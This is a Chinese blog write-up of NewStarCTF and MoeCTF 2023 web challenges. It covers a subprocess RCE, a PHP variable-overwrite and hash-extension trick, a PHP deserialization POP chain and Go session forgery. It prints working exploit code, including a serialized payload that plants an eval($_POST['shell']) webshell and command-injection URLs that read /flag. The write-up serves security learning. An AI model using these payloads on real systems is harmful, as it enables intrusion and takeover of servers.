<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>NewStars Moe CTF2023 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="NewStars Moe CTF2023" />
<meta property="og:description" content="分享一下最近再BUU打的NewStarCTF以及MoeCTF
这里主要说一下难题的解题过程
ez_rce 题目提示攻击子进程调用，查看一下app里代码
所以考察进程模块实现命令执行
from flask import * import subprocess app = Flask(__name__) def gett(obj,arg): tmp = obj for i in arg: tmp = getattr(tmp,i) return tmp def sett(obj,arg,num): tmp = obj for i in range(len(arg)-1): tmp = getattr(tmp,arg[i]) setattr(tmp,arg[i&#43;1],num) def hint(giveme,num,bol): c = gett(subprocess,giveme) tmp = list(c) tmp[num] = bol tmp = tuple(tmp) sett(subprocess,giveme,tmp) def cmd(arg): subprocess.call(arg) @app.route(&#39;/&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;]) def exec(): try: if request.args.get(&#39;exec&#39;)==&#39;ok&#39;: shell = request.args.get(&#39;shell&#39;) cmd(shell) else: exp = list(request." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/971cf1da8d89e896afc7ed0424cd8232/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-11-04T20:35:50+08:00" />
<meta property="article:modified_time" content="2023-11-04T20:35:50+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">NewStars Moe CTF2023</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>分享一下最近再BUU打的NewStarCTF以及MoeCTF</p> 
<p>这里主要说一下难题的解题过程</p> 
<h4>ez_rce</h4> 
<p><img alt="" height="171" src="https://images2.imgbox.com/a5/35/6JYs3tCz_o.png" width="472"></p> 
<p>题目提示攻击子进程调用，查看一下app里代码</p> 
<p>所以考察进程模块实现命令执行</p> 
<pre><code>from flask import *
import subprocess

app = Flask(__name__)

def gett(obj,arg):
    tmp = obj
    for i in arg:
        tmp = getattr(tmp,i)
    return tmp

def sett(obj,arg,num):
    tmp = obj
    for i in range(len(arg)-1):
        tmp = getattr(tmp,arg[i])
    setattr(tmp,arg[i+1],num)

def hint(giveme,num,bol):
    c = gett(subprocess,giveme)
    tmp = list(c)
    tmp[num] = bol
    tmp = tuple(tmp)
    sett(subprocess,giveme,tmp)

def cmd(arg):
    subprocess.call(arg)


@app.route('/',methods=['GET','POST'])
def exec():
    try:
        if request.args.get('exec')=='ok':
            shell = request.args.get('shell')
            cmd(shell)
        else:
            exp = list(request.get_json()['exp'])
            num = int(request.args.get('num'))
            bol = bool(request.args.get('bol'))
            hint(exp,num,bol)
        return 'ok'
    except:
        return 'error'
    
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)</code></pre> 
<p>打开题目环境发现：</p> 
<p><img alt="" height="201" src="https://images2.imgbox.com/f3/da/RIuAGzpr_o.png" width="1200"></p> 
<p>只有一个error，首先进行代码审计</p> 
<p>存在exec0方法，如果接收参数exec值为ok，那么将接收GET参数shell，然后执行作为参数传入cmd0方法里; 否则从请求的JSON 数据中获取名为 exp 的字段值，并将其转换为列表类型，获取GET参数num并转为int型，接收GET参数bol并转为布尔型，执行hint方法，包括gett函数去遍历获取subprocess的属性，sett函数是遍历并将取到的属性设置为修改后的值，然后返回ok，</p> 
<p>所以根据审计后的代码找到命令执行的subprecess.call函数</p> 
<p>网上随便找到一个<img alt="" height="141" src="https://images2.imgbox.com/c0/58/vdGt6RLx_o.png" width="805"></p> 
<p><img alt="" height="277" src="https://images2.imgbox.com/a7/3e/sfqb9XH6_o.png" width="957"></p> 
<p>发现call函数会返回一个Popen方法</p> 
<p><img alt="" height="632" src="https://images2.imgbox.com/9e/3a/3vyiLlBk_o.png" width="1110"></p> 
<p>发现Popen方法里有一个默认构造参数默认shel为False，</p> 
<p>函数默认保存在defaults属性当中，如果让shell为True的话就可以进行命令执行</p> 
<p>这里可以用postman进行接口测试，随便给exec赋值进行else判断，exp根据call函数进行赋值需要经过gett进行遍历格式为数组</p> 
<p>根据<img alt="" height="242" src="https://images2.imgbox.com/9f/71/UQ3iodbt_o.png" width="891"></p> 
<p><img alt="" height="667" src="https://images2.imgbox.com/80/04/fKTvOek2_o.png" width="1052"></p> 
<p>成功后就可以进行命令执行</p> 
<p>可以构造exp</p> 
<pre><code>?exec=ok&amp;shell=mkdir%20./static;cat%20/flag&gt;./static/1.txt

</code></pre> 
<p><img alt="" height="647" src="https://images2.imgbox.com/a9/71/vs9fgNNH_o.png" width="1172"></p> 
<p>num要对照第八个令其返回true（同为字符串返回为True）</p> 
<p>访问可得到flag</p> 
<p><img alt="" height="704" src="https://images2.imgbox.com/66/87/bBQUyBcK_o.png" width="1200"></p> 
<h4>MD5的事就拜托了</h4> 
<pre><code> &lt;?php
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['SHCTF'])){
    extract(parse_url($_POST['SHCTF']));
    if($$$scheme==='SHCTF'){
        echo(md5($flag));
        echo("&lt;/br&gt;");
    }
    if(isset($_GET['length'])){
        $num=$_GET['length'];
        if($num*100!=intval($num*100)){
            echo(strlen($flag));
            echo("&lt;/br&gt;");
        }
    }
}
if($_POST['SHCTF']!=md5($flag)){
    if($_POST['SHCTF']===md5($flag.urldecode($num))){
        echo("flag is".$flag);
    }
} </code></pre> 
<p>此题考察变量覆盖以及哈希拓展攻击</p> 
<p>先说第一个if，可以通过一些构造通过变量覆盖返回flag的md5值</p> 
<pre><code>$scheme=host
$$scheme=$host=user
$$$scheme=$$host=$user=SHCTF</code></pre> 
<p>故而可以构造：</p> 
<pre><code>SHCTF=host://SHCTF:1@user</code></pre> 
<p><img alt="" height="669" src="https://images2.imgbox.com/92/e5/Mp78Wk0r_o.png" width="720"></p> 
<p>绕过intval函数可以通过无限小数1.222222222222绕过的出flag的长度</p> 
<p><img alt="" height="629" src="https://images2.imgbox.com/30/03/6SRJAB8U_o.png" width="1030"></p> 
<p>之后用到hash_ext_attack脚本</p> 
<p><img alt="" height="329" src="https://images2.imgbox.com/59/da/RRIPabxb_o.png" width="1200"></p> 
<p>直接构造：</p> 
<p><img alt="" height="812" src="https://images2.imgbox.com/2c/80/NkAK7WeF_o.png" width="1200"></p> 
<p>之后拿到flag</p> 
<h4>sseerriiaalliizzee</h4> 
<p>打开题目：</p> 
<pre><code> &lt;?php
error_reporting(0);
highlight_file(__FILE__);

class Start{
    public $barking;
    public function __construct(){
        $this-&gt;barking = new Flag;
    }
    public function __toString(){
            return $this-&gt;barking-&gt;dosomething();
    }
}

class CTF{ 
    public $part1;
    public $part2;
    public function __construct($part1='',$part2='') {
        $this -&gt; part1 = $part1;
        $this -&gt; part2 = $part2;
        
    }
    public function dosomething(){
        $useless   = '&lt;?php die("+Genshin Impact Start!+");?&gt;';
        $useful= $useless. $this-&gt;part2;
        file_put_contents($this-&gt; part1,$useful);
    }
}
class Flag{
    public function dosomething(){
        include('./flag,php');
        return "barking for fun!";
        
    }
}

    $code=$_POST['code']; 
    if(isset($code)){
       echo unserialize($code);
    }
    else{
        echo "no way, fuck off";
    }
?&gt; 
no way, fuck off </code></pre> 
<p>难度主要在于如何绕过die方法</p> 
<p>构造pop链</p> 
<pre><code>Start.__construct() --&gt; Flag.dosomething() --&gt; Start__toString() --&gt; CTF.dosomething()
</code></pre> 
<p>这里也是通过百度发现，可以通过strip_tags绕过，因为这个代码实际是xml标签可以利用strip_tags函数去除，并且用到php://filter协议，通过strip_tages去除exit</p> 
<p>直接构造exp：</p> 
<pre><code>&lt;?php
class Start{
    public $barking;

}
class CTF{ 
    public $part1;
    public $part2;
}

$a=new Start();
$c=new CTF();
$a-&gt;barking=$c;
$c-&gt;part1='php://filter/string.strip_tags|convert.base64-decode/resource=shell.php';
$c-&gt;part2='PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+';
echo serialize($a);
?&gt; 
</code></pre> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/75/1f/LJbyC7Ci_o.png" width="1200"></p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/6e/31/ZARsklVu_o.png" width="1077"></p> 
<p>直接flag出</p> 
<p></p> 
<h4>gogogo</h4> 
<p><img alt="" height="366" src="https://images2.imgbox.com/25/94/slBlYjnZ_o.png" width="1133"></p> 
<p>好家伙跟我之前打2023CISCN有道题一样  go_session，也是通过伪造admin的session</p> 
<p>好那就再写一次，题源码已经给出</p> 
<p><img alt="" height="364" src="https://images2.imgbox.com/d7/2c/o2D406qM_o.png" width="545"></p> 
<p>亚麻呆住，跟那道国赛题差不多一样</p> 
<p>也是启动环境设置代理</p> 
<pre><code>go env -w GOPROXY=https://goproxy.io,direct
</code></pre> 
<p>更改index函数代码</p> 
<p><img alt="" height="650" src="https://images2.imgbox.com/c3/46/UWlIuMuK_o.png" width="1027"></p> 
<p>直接就需要run一下</p> 
<p><img alt="" height="165" src="https://images2.imgbox.com/87/f2/JOxOVgs0_o.png" width="990"></p> 
<p><img alt="" height="620" src="https://images2.imgbox.com/bc/77/DfcHcNh5_o.png" width="1200"></p> 
<p>成功监听到了</p> 
<p><img alt="" height="442" src="https://images2.imgbox.com/7b/37/z04cHNWG_o.png" width="1200"></p> 
<p>我这里也是返回200值</p> 
<p><img alt="" height="496" src="https://images2.imgbox.com/bb/45/RNB0jhdK_o.png" width="1200"></p> 
<p>取出这里头cookie即可</p> 
<p><img alt="" height="472" src="https://images2.imgbox.com/bc/65/CouWtSM3_o.png" width="1200"></p> 
<p>然后再去读那个</p> 
<pre><code>func Readflag(c *gin.Context) {
	session, err := store.Get(c.Request, "session-name")
	if err != nil {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		return
	}
	if session.Values["name"] == "admin" {
		c.String(200, "Congratulation! You are admin,But how to get flag?\n")

		path := c.Query("filename")

		reg := regexp.MustCompile(`[b-zA-Z_@#%^&amp;*:{|}+&lt;&gt;";\[\]]`)

		if reg.MatchString(path) {

			http.Error(c.Writer, "nonono", http.StatusInternalServerError)
			return
		}

		var data []byte
		if path != "" {
			data = readfile.ReadFile(path)
		} else {
			data = []byte("请传入参数")
		}

		c.JSON(200, gin.H{
			"success": "read: " + string(data),
		})
	} else {
		c.String(200, "Hello, User. How to become admin?")
	}

}</code></pre> 
<p>不难发现有个a可以进行读取还有？</p> 
<p><img alt="" height="201" src="https://images2.imgbox.com/cf/f9/cYlVKPaw_o.png" width="1200"></p> 
<p>直接通过??a?（通配符）读取flag</p> 
<p><img alt="" height="428" src="https://images2.imgbox.com/0b/14/3VoQAsPR_o.png" width="1200"></p> 
<p></p> 
<h2>Moectf</h2> 
<p>很多东西要去写的时候发现环境没了，我之前写的wp因为服务器原因也没了（所买的云服务器因为地区数据清空了可怜我写了两个月的blog）</p> 
<p>只能附上其他佬的wp了：<a class="has-card" href="https://github.com/XDSEC/MoeCTF_2023/blob/main/WriteUps/TT/WEB.md" title="https://github.com/XDSEC/MoeCTF_2023/blob/main/WriteUps/TT/WEB.md"><span class="link-card-box"><span class="link-title">https://github.com/XDSEC/MoeCTF_2023/blob/main/WriteUps/TT/WEB.md</span><span class="link-link"><img class="link-link-icon" src="https://images2.imgbox.com/5a/84/7ghRJL8t_o.png" alt="icon-default.png?t=N7T8">https://github.com/XDSEC/MoeCTF_2023/blob/main/WriteUps/TT/WEB.md</span></span></a></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/5e4db31325387e42751c994df6692f18/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">golang 详解协程——errgroup</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/73f69a2db2344037af2b9d79d2108415/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Hybrid App（原生&#43;H5）开发</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>